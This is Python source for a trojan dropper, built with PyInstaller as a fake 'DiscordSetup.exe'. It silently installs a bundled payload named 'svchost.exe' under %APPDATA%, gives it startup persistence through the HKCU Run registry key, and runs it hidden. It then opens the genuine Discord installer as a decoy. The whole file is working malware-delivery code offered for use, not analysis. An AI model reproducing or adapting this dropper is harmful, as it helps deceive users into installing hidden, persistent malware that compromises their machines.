#pyinstaller --onefile --noconsole --add-data "src/Discord.exe;." --add-data "src/svchost.exe;." --name DiscordSetup.exe --icon Icon.ico setup.py


import os
import sys
import shutil
import subprocess
import winreg
import time

APPDATA = os.getenv('APPDATA')
INSTALL_DIR = os.path.join(APPDATA, 'DiscordLog')
MALWARE_NAME = 'svchost.exe'
SETUP_NAME = 'Discord.exe'

def log(message):
    print(f"[{time.strftime('%H:%M:%S')}] {message}")

def create_install_folder():
    try:
        os.makedirs(INSTALL_DIR, exist_ok=True)
        log(f"Created install folder at {INSTALL_DIR}")
        return True
    except Exception as e:
        log(f"Error creating folder: {e}")
        return False

def copy_file(src, dst):
    try:
        shutil.copy2(src, dst)
        log(f"Copied {os.path.basename(src)} to {dst}")
        return True
    except Exception as e:
        log(f"Error copying {os.path.basename(src)}: {e}")
        return False

def add_startup_registry(exe_path):
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_name = "DiscordLog"
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path) as key:
            winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, exe_path)
        log(f"Added registry key for startup: {key_name} -> {exe_path}")
        return True
    except Exception as e:
        log(f"Error setting registry: {e}")
        return False

def run_exe(exe_path, hidden=False):
    flags = 0
    if hidden:
        flags = subprocess.CREATE_NO_WINDOW
    try:
        subprocess.Popen([exe_path], creationflags=flags)
        log(f"Launched {'hidden' if hidden else 'visible'} executable: {os.path.basename(exe_path)}")
    except Exception as e:
        log(f"Error launching {os.path.basename(exe_path)}: {e}")

def main():
    if not create_install_folder():
        return

    base_path = getattr(sys, '_MEIPASS', os.path.dirname(os.path.abspath(__file__)))

    malware_src = os.path.join(base_path, MALWARE_NAME)
    malware_dst = os.path.join(INSTALL_DIR, MALWARE_NAME)
    if not os.path.exists(malware_src):
        log(f"Malware source file not found: {malware_src}")
        return
    if not os.path.exists(malware_dst):
        if not copy_file(malware_src, malware_dst):
            return

    discord_src = os.path.join(base_path, SETUP_NAME)
    discord_dst = os.path.join(INSTALL_DIR, SETUP_NAME)
    if not os.path.exists(discord_src):
        log(f"DiscordSetup source file not found: {discord_src}")
        return
    if not os.path.exists(discord_dst):
        if not copy_file(discord_src, discord_dst):
            return

    if not add_startup_registry(malware_dst):
        return

   
    run_exe(malware_dst, hidden=True)

    
    run_exe(discord_dst, hidden=False)

if __name__ == '__main__':
    main()
